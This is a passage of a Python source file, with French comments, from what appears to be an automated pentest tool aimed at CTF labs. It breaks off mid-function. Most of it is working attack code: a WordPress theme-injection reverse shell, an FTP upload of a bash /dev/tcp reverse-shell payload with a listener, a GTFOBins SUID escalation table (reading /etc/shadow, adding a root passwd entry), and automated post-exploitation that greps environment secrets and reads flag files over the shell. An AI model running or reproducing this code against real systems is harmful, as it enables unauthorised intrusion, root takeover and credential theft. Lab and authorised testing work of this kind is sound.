    def _wp_listen():
        nonlocal shell_conn_wp, shell_addr, shell_obtained
        try:
            srv_wp = _sock_wp.socket(_sock_wp.AF_INET, _sock_wp.SOCK_STREAM)
            srv_wp.setsockopt(_sock_wp.SOL_SOCKET, _sock_wp.SO_REUSEADDR, 1)
            srv_wp.bind(("0.0.0.0", cfg.lport))
            srv_wp.listen(1)
            srv_wp.settimeout(30)
            shell_conn_wp, addr = srv_wp.accept()
            shell_obtained = True
            shell_addr = f"{addr[0]}:{addr[1]}"
            srv_wp.close()
        except _sock_wp.timeout:
            pass
        except Exception as ex:
            lines.append(f"[!] Listener erreur: {ex}")

    def _trigger_payload():
        """Declenche le payload via requetes 404 WordPress apres 2s.
        Fire-and-forget : timeout long pour laisser le nohup démarrer,
        mais on ne bloque pas le listener en attendant la réponse."""
        import time as _t, threading as _thr_fire
        _t.sleep(2)
        for trigger_url in [
            f"{wp_url}/?p=88888404notfound",
            f"{wp_url}/wp-content/themes/{theme_name}/404.php",
        ]:
            def _fire(url=trigger_url):
                try:
                    sess.get(url, timeout=60)
                except Exception:
                    pass
            _thr_fire.Thread(target=_fire, daemon=True).start()
            info(f"[WP Exploit] Declencheur HTTP -> {trigger_url}")
            _t.sleep(1)

    t_listen  = _thr_wp.Thread(target=_wp_listen,      daemon=True)
    t_trigger = _thr_wp.Thread(target=_trigger_payload, daemon=True)
    t_listen.start()
    t_trigger.start()
    t_listen.join(timeout=35)   # 30s listener + 5s buffer

    if shell_conn_wp is None:
        warn(f"[WP Exploit] Timeout 90s — aucune connexion recue sur {cfg.lhost}:{cfg.lport}")
        lines.append(f"[!] Timeout — verifie que LHOST={cfg.lhost} est ton IP VPN (tun0)")
        lines.append(f"    Commande manuelle: nc -nvlp {cfg.lport}")
    else:
        ok(f"[WP Exploit] Shell recu depuis {shell_addr}!")
        lines.append(f"[+] Shell obtenu depuis {shell_addr}\n")

        info("[WP Exploit] Lancement post-exploitation (SUID, sudo, reseau...)")
        post_results = _run_postexploit_via_socket(shell_conn_wp, logs_dir)
        lines.append(post_results.get("raw", ""))

        shell_results["id"]        = post_results.get("id", "?")
        shell_results["whoami"]    = post_results.get("whoami", "?")
        shell_results["hostname"]  = post_results.get("hostname", "?")
        shell_results["uname"]     = post_results.get("uname", "?")
        shell_results["suid_hits"] = post_results.get("suid_hits", [])
        if post_results.get("privesc_method"):
            ok(f"[WP Exploit] ESCALADE REUSSIE : {post_results['privesc_method']}")
            shell_results["privesc_method"] = post_results["privesc_method"]
            shell_results["privesc_id"]     = post_results.get("privesc_id", "?")

        try:
            shell_conn_wp.close()
        except Exception as _exc:
            warn(f"[run_wordpress_theme_inject] {_exc}")

    out.write_text("\n".join(lines), encoding="utf-8")


    # _run_postexploit_via_socket écrit déjà dans post_exploit/ — pas besoin de dupliquer ici.

    if shell_obtained:
        return {
            "title":          "WordPress — Reverse Shell via Theme Injection",
            "severity":       "critical",
            "detail":         (f"Shell obtenu via {theme_name}/404.php → {cfg.lhost}:{cfg.lport}. "
                               f"Utilisateur : {shell_results.get('whoami', shell_results.get('id', '?'))}"),
            "shell_obtained": True,
            "shell_addr":     shell_addr,
            "user":           shell_results.get("id", shell_results.get("whoami", "?")),
            "phase":          "exploitation",
            "source":         "wp_theme_inject",
            "wp_url":         wp_url,
            "theme":          theme_name,
            "evidence_file":  str(out),
            # ── Données post-exploitation (via module universel) ──
            "suid_hits":      shell_results.get("suid_hits", []),
            "privesc_method": shell_results.get("privesc_method"),
            "privesc_id":     shell_results.get("privesc_id"),
        }
    return {
        "title":         "WordPress — Theme Injection tentée (shell non reçu)",
        "severity":      "high",
        "detail":        (f"Payload PHP injecté dans {theme_name}/{file_slug} via wp-admin "
                          f"mais aucune connexion shell reçue sur {cfg.lhost}:{cfg.lport} (timeout 30s)."),
        "phase":         "exploitation",
        "source":        "wp_theme_inject",
        "wp_url":        wp_url,
        "theme":         theme_name,
        "evidence_file": str(out),
    }


# -------------------- WEB ENUM (classic, legacy) --------------------
def pick_http_urls(target: str, services: List[dict], probe_timeout: float = 4.0) -> List[str]:
    """
    Retourne les URLs HTTP/HTTPS à énumérer.
    - Ports web connus (80, 443, 8080…) → ajout direct
    - Ports non-standard > 1024 → sonde HTTP pour confirmer
      (utile pour ports comme 32768, 3000, 5000 qui peuvent être des apps web)
    """
    urls: List[str] = []
    non_web = NON_WEB_PORTS  # {21, 22, 25, ...}

    for s in services:
        name = (s.get("name") or "").lower()
        port = int(s.get("port") or 0)
        if not port:
            continue

        # Ports web identifiés par nmap (-sV)
        if "http" in name:
            is_https = ("https" in name) or ("ssl" in name) or (port in (443, 8443, 9443, 10443))
            scheme = "https" if is_https else "http"
            urls.append(url_from_host_port(target, port, scheme))
            continue

        # Ports web connus même sans identification nmap
        if port in COMMON_WEB_PORTS:
            is_https = port in (443, 8443, 9443, 10443)
            scheme = "https" if is_https else "http"
            urls.append(url_from_host_port(target, port, scheme))
            continue

        # Ports non-standard > 1024 : sonde HTTP rapide
        if port > 1024 and port not in non_web:
            scheme = guess_scheme(target, port, timeout=probe_timeout)
            if scheme:
                urls.append(url_from_host_port(target, port, scheme))

    return list(dict.fromkeys(urls))

def run_web_tools(cfg: Config, urls: List[str], logs_dir: Path) -> Dict[str, List[str]]:
    results: Dict[str, List[str]] = {"whatweb": [], "nikto": [], "gobuster": [], "ffuf": []}
    if not urls:
        return results

    info("Étape 4/4 — Enum web automatique (parallèle)")

    do_whatweb = which("whatweb")
    do_nikto = which("nikto") and not cfg.no_nikto
    do_gobuster = which("gobuster") and cfg.wordlist.exists() and not cfg.use_ffuf
    do_ffuf = which("ffuf") and cfg.wordlist.exists() and cfg.use_ffuf

    if not do_whatweb:
        warn("whatweb absent -> SKIP")
    if cfg.no_nikto:
        info("nikto désactivé (--no-nikto)")
    elif not which("nikto"):
        warn("nikto absent -> SKIP")
    if cfg.use_ffuf:
        if do_ffuf:
            info("ffuf activé (remplace gobuster)")
        else:
            warn("ffuf activé mais absent -> SKIP")
    elif not do_gobuster:
        warn("gobuster ou wordlist absente -> SKIP")

    def _whatweb(u: str) -> Optional[str]:
        if not do_whatweb:
            return None
        out = logs_dir / f"whatweb_{safe_name(u)}.txt"
        run_cmd(["whatweb", "-v", "--color=never", u], out, timeout=cfg.web_timeout_short, label=f"whatweb {u}", verbose=cfg.verbose)
        return str(out)

    def _nikto(u: str) -> Optional[str]:
        if not do_nikto:
            return None
        out = logs_dir / f"nikto_{safe_name(u)}.txt"
        run_cmd(["nikto", "-h", u], out, timeout=cfg.web_timeout_long, label=f"nikto {u}", verbose=cfg.verbose)
        return str(out)

    def _gobuster(u: str) -> Optional[str]:
        if not do_gobuster:
            return None
        out = logs_dir / f"gobuster_{safe_name(u)}.txt"
        run_cmd(
            ["gobuster", "dir", "-u", u, "-w", str(cfg.wordlist), "-q", "-t", str(cfg.gobuster_threads)],
            out,
            timeout=cfg.web_timeout_long,
            label=f"gobuster {u}",
            verbose=cfg.verbose,
        )
        return str(out)

    def _ffuf(u: str) -> Optional[str]:
        if not do_ffuf:
            return None
        out = logs_dir / f"ffuf_{safe_name(u)}.txt"
        out_csv = logs_dir / f"ffuf_{safe_name(u)}.csv"
        run_cmd(
            [
                "ffuf", "-u", f"{u}/FUZZ", "-w", str(cfg.wordlist),
                "-t", str(cfg.ffuf_threads),
                "-mc", "200,204,301,302,307,401,403", "-fc", "404",
                # BUG FIX v0.65.1 : -sf supprimé (stoppait ffuf à 0 req/sec)
                "-ac", "-noninteractive",
                "-of", "csv", "-o", str(out_csv),  # BUG FIX : CSV dans fichier dédié
            ],
            out,
            timeout=cfg.web_timeout_long,
            label=f"ffuf {u}",
            verbose=cfg.verbose,
        )
        return str(out_csv)

    jobs: List[Tuple[str, str, callable]] = []
    for u in urls:
        jobs.append(("whatweb", u, _whatweb))
        jobs.append(("nikto", u, _nikto))
        jobs.append(("gobuster", u, _gobuster))
        jobs.append(("ffuf", u, _ffuf))

    max_workers = max(2, min(cfg.threads, len(jobs)))

    if RICH:
        progress = Progress(
            SpinnerColumn(),
            TextColumn("[bold]{task.description}[/bold]"),
            BarColumn(),
            TimeElapsedColumn(),
            console=console,
        )
        with progress:
            task_id = progress.add_task(f"{len(jobs)} jobs", total=len(jobs))
            with ThreadPoolExecutor(max_workers=max_workers) as exe:
                futures = {exe.submit(fn, url): (tool, url) for tool, url, fn in jobs}
                for f in as_completed(futures):
                    tool, _ = futures[f]
                    try:
                        res = f.result()
                        if res:
                            results[tool].append(res)
                    except Exception as ex:
                        warn(f"{tool} erreur: {ex}")
                    progress.advance(task_id, 1)
    else:
        with ThreadPoolExecutor(max_workers=max_workers) as exe:
            futures = {exe.submit(fn, url): (tool, url) for tool, url, fn in jobs}
            for f in as_completed(futures):
                tool, _ = futures[f]
                try:
                    res = f.result()
                    if res:
                        results[tool].append(res)
                except Exception as ex:
                    eprint(f"{tool} erreur: {ex}")

    return results

# ==================== CONFIRMATION UTILISATEUR (WebUI + CLI) ====================

def _webui_confirm(cfg: "Config", action_id: str, title: str, details: str = "", timeout: int = 300) -> bool:
    """
    Demande une confirmation avant une action d'exploitation.

    - Mode CLI interactif : affiche un prompt Confirm/input.
    - Mode WebUI (stdin coupé) : écrit un fichier JSON "pending" dans
      runs/_webui/<run_id>/confirm_<action_id>.json et attend la réponse
      de l'utilisateur via l'interface web (endpoint POST /api/confirm/…).

    Retourne True si l'utilisateur confirme, False sinon (timeout → False).
    """
    # ── Mode CLI interactif ──────────────────────────────────────────────────
    if sys.stdin.isatty():
        if RICH:
            msg = f"[yellow bold]{title}[/yellow bold]"
            if details:
                msg += f"\n[dim]{details}[/dim]"
            return Confirm.ask(msg, default=False)
        else:
            prompt = f"\n[?] {title}"
            if details:
                prompt += f"\n    {details}"
            prompt += "\n    Confirmer ? [y/N]: "
            return input(prompt).strip().lower() in ("y", "yes", "o", "oui")

    # ── Mode WebUI (subprocess, stdin=/dev/null) ─────────────────────────────
    confirm_dir = cfg.workspace / "_webui" / cfg.run_id
    confirm_dir.mkdir(parents=True, exist_ok=True)

    pending_file  = confirm_dir / f"confirm_{action_id}.json"
    response_file = confirm_dir / f"confirm_{action_id}_response.json"

    # Nettoyer une éventuelle ancienne réponse
    try:
        response_file.unlink(missing_ok=True)
    except Exception:
        pass

    payload = {
        "action_id": action_id,
        "title": title,
        "details": details,
        "status": "pending",
        "timestamp": time.time(),
    }
    try:
        pending_file.write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception as e:
        info(f"[!] Impossible d'écrire la confirmation ({e}) → SKIP")
        return False

    info(f"[WebUI] En attente de confirmation : {title}")

    deadline = time.time() + timeout
    while time.time() < deadline:
        if response_file.exists():
            try:
                resp = json.loads(response_file.read_text(encoding="utf-8"))
                confirmed = bool(resp.get("confirmed", False))
            except Exception:
                confirmed = False
            # Nettoyage
            try:
                pending_file.unlink(missing_ok=True)
                response_file.unlink(missing_ok=True)
            except Exception:
                pass
            if confirmed:
                ok(f"[WebUI] Confirmation reçue : {title}")
            else:
                warn(f"[WebUI] Refusé par l'utilisateur : {title}")
            return confirmed
        time.sleep(1)

    # Timeout → refus sécurisé
    warn(f"[WebUI] Timeout ({timeout}s) sans réponse → SKIP : {title}")
    try:
        pending_file.unlink(missing_ok=True)
    except Exception:
        pass
    return False

# ==================== INITIAL ACCESS + POST-EXPLOITATION (v0.67) ====================
# Module 6 — Initial Access via FTP reverse shell (si dossier writable détecté)
# Module 7 — Post-exploitation : SUID, sudo, passwd, crontab, GTFOBins matching
# Nécessite --lhost (IP attaquant/VPN tun0) pour le reverse shell.
# Post-exploit SSH déclenché auto si Hydra a trouvé des credentials.
# =====================================================================================

# ── GTFOBins SUID — dictionnaire local des plus exploitables ────────────────
# Source : https://gtfobins.github.io/ (SUID section)
GTFOBINS_SUID: Dict[str, str] = {
    "bash":    "/bin/bash -p",
    "sh":      "/bin/sh -p",
    "dash":    "/bin/dash -p",
    "env":     "/usr/bin/env /bin/sh -p",
    "python":  "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "perl":    "perl -e 'exec \"/bin/sh\";'",
    "ruby":    "ruby -e 'exec \"/bin/sh\"'",
    "find":    "find . -exec /bin/sh -p \\; -quit",
    "nmap":    "nmap --interactive  (puis !sh)",
    "vim":     "vim -c ':!/bin/sh'",
    "vi":      "vi -c ':!/bin/sh'",
    "nano":    "nano → ^R^X → reset; sh 1>&0 2>&0",
    "awk":     "awk 'BEGIN {system(\"/bin/sh\")}'",
    "less":    "less /etc/passwd → !/bin/sh",
    "more":    "more /etc/passwd → !/bin/sh",
    "man":     "man man → !/bin/sh",
    "curl":    "curl file:///etc/shadow",
    "wget":    "wget file:///etc/shadow",
    "cp":      "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p",
    "tee":     "echo 'root2::0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
    "dd":      "dd if=/etc/shadow",
    "tar":     "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip":     "zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'",
    "node":    "node -e 'child_process.spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'",
    "php":     "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'",
    "lua":     "lua -e 'os.execute(\"/bin/sh\")'",
    "git":     "git help config → !/bin/sh",
    "base64":  "base64 /etc/shadow | base64 -d",
}

POST_EXPLOIT_COMMANDS: List[Tuple[str, str]] = [
    ("id",            "id"),
    ("whoami",        "whoami"),
    ("hostname",      "hostname"),
    ("uname",         "uname -a"),
    ("os_release",    "cat /etc/os-release 2>/dev/null | head -5"),
    ("passwd",        "cat /etc/passwd 2>/dev/null"),
    ("shadow_check",  "ls -la /etc/shadow 2>/dev/null"),
    ("home_dirs",     "ls -la /home/ 2>/dev/null"),
    ("sudo_l",        "sudo -l 2>/dev/null"),
    ("suid",          "find / -perm -4000 -type f 2>/dev/null | grep -v '/snap/' | head -50"),
    ("sgid",          "find / -perm -2000 -type f 2>/dev/null | grep -v '/snap/' | head -30"),
    ("crontab",       "cat /etc/crontab 2>/dev/null"),
    ("cron_d",        "ls -la /etc/cron* 2>/dev/null"),
    ("env_vars",      "env 2>/dev/null | grep -iE 'pass|secret|key|token' 2>/dev/null"),
    ("network",       "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
    ("processes",     "ps aux 2>/dev/null | head -20"),
    ("writable_dirs", "find / -writable -type d 2>/dev/null | grep -v proc | head -20"),
    ("interesting",   "find /home /tmp /var/www /opt -name '*.txt' -o -name '*.bak' -o -name '*.conf' 2>/dev/null | head -20"),
]


def _parse_suid_findings(suid_output: str) -> List[Dict[str, str]]:
    """Parse la sortie de find -perm -4000 et match contre GTFOBins."""
    results = []
    for line in suid_output.splitlines():
        line = line.strip()
        if not line or line.startswith("find:"):
            continue
        binary_name = Path(line).name
        if binary_name in GTFOBINS_SUID:
            results.append({
                "path": line,
                "name": binary_name,
                "exploit": GTFOBINS_SUID[binary_name],
            })
    return results


# ── Module 6 : Initial Access via FTP ───────────────────────────────────────
def run_ftp_initial_access(
    cfg: Config,
    services: List[dict],
    ftp_finding: Optional[dict],
    logs_dir: Path,
) -> Optional[dict]:
    """
    Si un dossier FTP writable avec des .sh a été trouvé (phase exploitation),
    génère un payload bash reverse shell, l'uploade via FTP, puis lance un
    listener Python natif et attend la connexion pendant 90 secondes.
    Une fois le shell obtenu, exécute automatiquement les commandes post-exploit.
    """
    if not cfg.lhost:
        warn("Initial access FTP: --lhost requis (ex: --lhost 10.8.0.1) -> SKIP")
        return None
    if ftp_finding is None:
        return None

    writable = ftp_finding.get("writable_dirs", [])
    if not writable:
        return None

    # Cherche un .sh téléchargé dans les fichiers FTP
    downloaded = ftp_finding.get("files_downloaded", [])
    sh_files = [f for f in downloaded if f.endswith(".sh")]

    import ftplib, socket as _sock, io, threading

    ftp_svcs = [s for s in services if "ftp" in (s.get("name") or "").lower() or int(s.get("port") or 0) == 21]
    if not ftp_svcs:
        return None
    ftp_port = int(ftp_svcs[0]["port"])

    out = logs_dir / "exploit_initial_access.txt"
    lines: List[str] = [
        f"# Initial Access — FTP Reverse Shell\n"
        f"# Target  : {cfg.target}:{ftp_port}\n"
        f"# LHOST   : {cfg.lhost}:{cfg.lport}\n"
        f"# {now_iso()}\n\n"
    ]

    # ── Payload reverse shell bash ────────────────────────────────────────
    payload = (
        "#!/bin/bash\n"
        f"bash -i >& /dev/tcp/{cfg.lhost}/{cfg.lport} 0>&1\n"
    )

    # Détermine la cible d'upload
    # Priorité : clean.sh dans writable, sinon premier .sh trouvé
    target_remote = None
    for d in writable:
        remote_try = f"{d.rstrip('/')}/clean.sh"
        target_remote = remote_try
        break
    if not target_remote and sh_files:
        fname = Path(sh_files[0]).name
        target_remote = f"{writable[0].rstrip('/')}/{fname}"

    if not target_remote:
        lines.append("[-] Aucun .sh cible identifié dans le dossier writable.\n")
        out.write_text("".join(lines), encoding="utf-8")
        return None

    lines.append(f"[*] Payload généré:\n{payload}\n")
    lines.append(f"[*] Upload vers: {target_remote}\n\n")

    # ── Upload via FTP ────────────────────────────────────────────────────
    upload_ok = False
    try:
        ftp = ftplib.FTP()
        ftp.connect(cfg.target, ftp_port, timeout=15)
        # Tentative login : hint credentials d'abord, sinon anonymous
        _ftp_logins = []
        if cfg.hint_username and cfg.hint_password:
            _ftp_logins.append((cfg.hint_username, cfg.hint_password))
        _ftp_logins.append(("anonymous", "anonymous@pentool"))
        _logged = False
        for _u, _p in _ftp_logins:
            try:
                ftp.login(_u, _p)
                lines.append(f"[+] Login FTP réussi: {_u}\n")
                _logged = True
                break
            except Exception as _le:
                lines.append(f"[-] Login FTP {_u} échoué: {_le}\n")
        if not _logged:
            raise Exception("Tous les logins FTP ont échoué")
        # PASV par défaut, fallback ACTIVE si rejeté par le serveur
        try:
            ftp.storbinary(f"STOR {target_remote}", io.BytesIO(payload.encode()))
        except Exception:
            ftp.set_pasv(False)
            ftp.storbinary(f"STOR {target_remote}", io.BytesIO(payload.encode()))
        ftp.quit()
        upload_ok = True
        lines.append(f"[+] Upload réussi: {target_remote}\n")
        ok(f"[+] Payload uploadé sur {cfg.target}:{target_remote}")
    except Exception as e:
        lines.append(f"[!] Upload FTP échoué: {e}\n")
        bad(f"Upload FTP échoué: {e}")
        out.write_text("".join(lines), encoding="utf-8")
        return {"severity": "info", "title": f"Initial Access: upload échoué ({e})",
                "source": "initial_access", "phase": "initial_access", "evidence_file": str(out)}

    # ── Listener Python natif ─────────────────────────────────────────────
    info(f"[*] Listener démarré sur 0.0.0.0:{cfg.lport} — attente du shell (90s max)…")
    info(f"[*] Le cron job exécutera {target_remote} sous peu.")
    lines.append(f"\n[*] Listener 0.0.0.0:{cfg.lport} — attente 90s…\n")

    shell_conn = None
    shell_addr = None

    def _listen():
        nonlocal shell_conn, shell_addr
        try:
            srv = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", cfg.lport))
            srv.listen(1)
            srv.settimeout(90)
            shell_conn, shell_addr = srv.accept()
            srv.close()
        except _sock.timeout:
            pass
        except Exception as ex:
            lines.append(f"[!] Listener erreur: {ex}\n")

    t = threading.Thread(target=_listen, daemon=True)
    t.start()
    t.join(timeout=95)

    if shell_conn is None:
        lines.append("[!] Timeout — aucun reverse shell reçu en 90s.\n")
        lines.append("    Vérifie que le cron job tourne et que le port est accessible.\n")
        lines.append(f"    Commande manuelle: nc -nvlp {cfg.lport}\n")
        warn("Timeout — reverse shell non reçu. Le cron job tourne peut-être pas encore.")
        out.write_text("".join(lines), encoding="utf-8")
        return {
            "severity": "medium",
            "title": f"Initial Access: payload uploadé ({target_remote}) — listener timeout",
            "source": "initial_access", "phase": "initial_access", "evidence_file": str(out),
            "shell_obtained": False,
        }

    # ── Shell obtenu ! ────────────────────────────────────────────────────
    ok(f"[+] SHELL OBTENU depuis {shell_addr}!")
    lines.append(f"\n[+] SHELL OBTENU depuis {shell_addr}\n\n")

    # Post-exploitation via le shell reverse
    post_results = _run_postexploit_via_socket(shell_conn, logs_dir)
    lines.append(post_results["raw"])

    try:
        shell_conn.close()
    except Exception as _exc:
        warn(f"[run_ftp_initial_access] {_exc}")

    out.write_text("".join(lines), encoding="utf-8")

    suid_hits = post_results.get("suid_hits", [])
    privesc_method = post_results.get("privesc_method")
    privesc_id     = post_results.get("privesc_id")
    got_root = bool(privesc_id and ("uid=0" in privesc_id or "euid=0" in privesc_id or "root" in (privesc_id or "").lower()))
    return {
        "severity": "critical",
        "title": f"Initial Access + Post-exploit — Shell obtenu ({shell_addr[0]})",
        "source": "initial_access",
        "phase": "initial_access",
        "evidence_file": str(out),
        "shell_obtained": True,
        "shell_addr": str(shell_addr),
        "suid_hits": suid_hits,
        "user": post_results.get("user", "?"),
        "privesc_method": privesc_method,
        "privesc_id": privesc_id,
        "got_root": got_root,
    }


def _run_postexploit_via_socket(conn, logs_dir: Path) -> dict:
    """
    Exécute les commandes post-exploit via un socket shell (reverse shell).
    Retourne les résultats parsés.
    """
    import socket as _sock
    import time as _time
    results: Dict[str, str] = {}
    raw_lines: List[str] = ["## Commandes post-exploitation\n\n"]
    suid_hits: List[dict] = []
    user = "?"

    # Drain initial : vider le banner bash (erreur TTY, prompt initial)
    # sans ça, _send_cmd("id") capte le message de démarrage de bash
    # plutôt que la réponse réelle à la commande.
    try:
        conn.settimeout(2.5)
        _banner = b""
        while True:
            try:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                _banner += chunk
            except _sock.timeout:
                break
        if _banner:
            raw_lines.append(f"[shell banner]\n{_banner.decode('utf-8', errors='replace')}\n\n")
    except Exception as _exc:
        warn(f"[_run_postexploit_via_socket] {_exc}")
    # Sync : envoie une commande témoin et attend sa réponse
    try:
        conn.send(b"echo __READY__\n")
        _time.sleep(1.5)
        conn.settimeout(2.0)
        _sync = b""
        while True:
            try:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                _sync += chunk
                if b"__READY__" in _sync:
                    break
            except Exception:
                break
    except Exception as _exc:
        warn(f"[_run_postexploit_via_socket] {_exc}")

    def _send_cmd(cmd: str, wait: float = 3.0) -> str:
        try:
            conn.send((cmd + "\n").encode())
            _time.sleep(wait)
            out = b""
            # Timeout court pour drainer tout ce qui arrive — on s'arrête
            # uniquement sur timeout (plus de données), pas sur taille chunk.
            # len(chunk) < 4096 est incorrect : TCP peut retourner n'importe quelle taille.
            conn.settimeout(1.0)
            while True:
                try:
                    chunk = conn.recv(8192)
                    if not chunk:
                        break
                    out += chunk
                except _sock.timeout:
                    break
            return strip_ansi(out.decode("utf-8", errors="replace"))
        except Exception as e:
            return f"[error: {e}]"

    for name, cmd in POST_EXPLOIT_COMMANDS:
        raw_lines.append(f"### {cmd}\n")
        # find -perm (suid/sgid/writable) peut générer beaucoup de sortie → wait plus long
        if "find" in cmd and ("-perm" in cmd or "-writable" in cmd):
            _wait = 15.0
        elif "find" in cmd:
            _wait = 8.0
        else:
            _wait = 2.0
        result = _send_cmd(cmd, wait=_wait)
        raw_lines.append(result + "\n")
        results[name] = result

        if name == "id":
            # Filtre l'écho de la commande (1ère ligne = "id" si le shell echo)
            lines_id = [l for l in result.strip().splitlines() if l.strip() and l.strip() != "id"]
            user = lines_id[0] if lines_id else result.strip().split("\n")[0]
            ok(f"[+] Shell user: {user}")
        if name == "suid":
            suid_hits = _parse_suid_findings(result)
            if suid_hits:
                ok(f"[+] SUID exploitables: {', '.join(h['name'] for h in suid_hits)}")
                raw_lines.append("\n### GTFOBins matches\n")
                for h in suid_hits:
                    raw_lines.append(f"  [{h['name']}] {h['path']}\n  → {h['exploit']}\n\n")

                # ── Tentative d'escalade SUID automatique ────────────────────
                # Binaires shell-spawning prioritaires (donnent un shell -p)
                SHELL_SUID = ["env", "bash", "sh", "dash", "python", "python3",
                              "perl", "ruby", "node", "find", "nmap", "vim", "vi",
                              "more", "less", "awk", "gawk", "php", "lua"]
                for hit in suid_hits:
                    bname = hit["name"]
                    bpath = hit["path"]
                    if bname not in SHELL_SUID:
                        continue
                    # Commande d'escalade adaptée au binaire
                    if bname in ("env",):
                        privesc_cmd = f"{bpath} /bin/sh -p"
                    elif bname in ("bash", "sh", "dash"):
                        privesc_cmd = f"{bpath} -p"
                    elif bname == "find":
                        privesc_cmd = f"{bpath} . -exec /bin/sh -p \\; -quit"
                    elif bname in ("python", "python3"):
                        privesc_cmd = f"{bpath} -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                    elif bname in ("perl",):
                        privesc_cmd = f"{bpath} -e 'exec \"/bin/sh\"'"
                    else:
                        continue  # pas de commande simple connue

                    info(f"[*] Tentative escalade SUID via {bname}: {privesc_cmd}")
                    raw_lines.append(f"\n### Escalade SUID — {bname}\n$ {privesc_cmd}\n")
                    # Envoie la commande d'escalade + id pour vérifier les droits
                    _send_cmd(privesc_cmd, wait=2.0)
                    check = _send_cmd("id", wait=2.0)
                    raw_lines.append(check + "\n")
                    if "uid=0" in check or "euid=0" in check or "root" in check.lower():
                        ok(f"[+] ROOT OBTENU via SUID {bname}! → {check.strip().splitlines()[0]}")
                        raw_lines.append("[+] ESCALADE RÉUSSIE — root!\n")
                        results["privesc_method"] = f"SUID {bname} ({bpath})"
                        results["privesc_id"] = check.strip()
                        # ── Lire les flags CTF dans le shell root ────────────
                        raw_lines.append("\n### Flags CTF (shell root SUID)\n")
                        postexploit_dir_suid = logs_dir / "post_exploit"
                        postexploit_dir_suid.mkdir(exist_ok=True)
                        for flag_path in ["/root/root.txt", "/home/namelessone/user.txt",
                                          "/home/*/user.txt", "/root/flag.txt",
                                          "/home/*/flag.txt", "/opt/flag.txt"]:
                            flag_raw = _send_cmd(f"cat {flag_path} 2>/dev/null", wait=3.0)
                            for fline in flag_raw.strip().splitlines():
                                fline = fline.strip()
                                if not fline: continue
                                if fline.endswith("$") or fline.endswith("#"): continue
                                if len(fline) <= 5: continue
                                if "cat " in fline and flag_path.split("/")[-1] in fline: continue
                                if fline.endswith("2>/dev/null"): continue
                                ok(f"[+] FLAG trouvé ({flag_path}): {fline[:80]}")
                                raw_lines.append(f"FLAG [{flag_path}]: {fline}\n")
                                results.setdefault("flags_found", [])
                                if isinstance(results["flags_found"], list):
                                    results["flags_found"].append({"path": flag_path, "value": fline})
                                fname_safe = flag_path.replace("/", "_").strip("_")
                                (postexploit_dir_suid / f"flag_{fname_safe}.txt").write_text(fline, encoding="utf-8")
                                break
                        break
                    else:
                        raw_lines.append(f"[-] Pas root ({check.strip()[:60]})\n")
        if name == "sudo_l" and "NOPASSWD" in result:
            ok(f"[+] sudo NOPASSWD détecté!")
            raw_lines.append("[!] sudo NOPASSWD — escalade possible!\n")

    # Sauvegarde les résultats individuels
    postexploit_dir = logs_dir / "post_exploit"
    postexploit_dir.mkdir(exist_ok=True)
    for name, content in results.items():
        (postexploit_dir / f"{name}.txt").write_text(content, encoding="utf-8", errors="replace")

    # ── Privesc avancée : Docker, LXD, Sudo, Cron writable ──────────────────
    # Seulement si on n'a pas encore de root via SUID
    if not results.get("privesc_method"):
        info("[*] Privesc avancée — Docker / LXD / Sudo / Cron writable")
        adv = _run_advanced_privesc(
            conn, logs_dir,
            id_result=results.get("id", ""),
            sudo_result=results.get("sudo_l", ""),
            suid_result=results.get("suid", ""),
        )
        raw_lines.append(adv.get("raw", ""))
        if adv.get("privesc_method"):
            results["privesc_method"] = adv["privesc_method"]
            results["privesc_id"]     = adv.get("privesc_id", "")
        if adv.get("flags_found"):
            results["flags_found"] = str(adv["flags_found"])
        if adv.get("writable_cron_scripts"):
            results["writable_cron_scripts"] = str(adv["writable_cron_scripts"])
        if adv.get("root_flag"):
            results["root_flag"] = adv["root_flag"]

    return {
        "raw": "".join(raw_lines),
        "suid_hits": suid_hits,
        "user": user,
        "results": results,
        "privesc_method": results.get("privesc_method", None),
        "privesc_id": results.get("privesc_id", None),
        "flags_found": results.get("flags_found"),
        "root_flag": results.get("root_flag"),
    }


# ── Module 7 : Post-exploitation via SSH ────────────────────────────────────
def run_postexploit_ssh(
    cfg: Config,
    services: List[dict],
    credentials: List[str],
    logs_dir: Path,
) -> Optional[dict]:
    """
    Post-exploitation via SSH avec paramiko.
    Credentials au format ['login:password', ...]
    Déclenché si Hydra a trouvé des credentials.
    """
    if not _paramiko_available():
        warn("Post-exploit SSH: paramiko requis -> SKIP")
        return None
    if not credentials:
        return None

    import paramiko as _pm

    # Prend le premier credential valide
    cred = credentials[0]
    if ":" not in cred:
        return None
    username, password = cred.split(":", 1)
    # Nettoie les prefixes style "host [port] login: user password: pass"
    m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", cred, re.IGNORECASE)
    if m:
        username, password = m.group(1), m.group(2)

    ssh_port = 22
    for s in services:
        if "ssh" in (s.get("name") or "").lower() or int(s.get("port") or 0) == 22:
            ssh_port = int(s["port"])
            break

    out = logs_dir / "post_exploit_ssh.txt"
    lines: List[str] = [
        f"# Post-exploitation SSH\n"
        f"# {cfg.target}:{ssh_port} — {username}:{password}\n"
        f"# {now_iso()}\n\n"
    ]

    try:
        client = _pm.SSHClient()
        client.set_missing_host_key_policy(_pm.AutoAddPolicy())
        client.connect(cfg.target, port=ssh_port, username=username,
                       password=password, timeout=10, banner_timeout=10)
        ok(f"[+] SSH connecté: {username}@{cfg.target}:{ssh_port}")
        lines.append(f"[+] Connexion SSH réussie: {username}@{cfg.target}\n\n")
    except Exception as e:
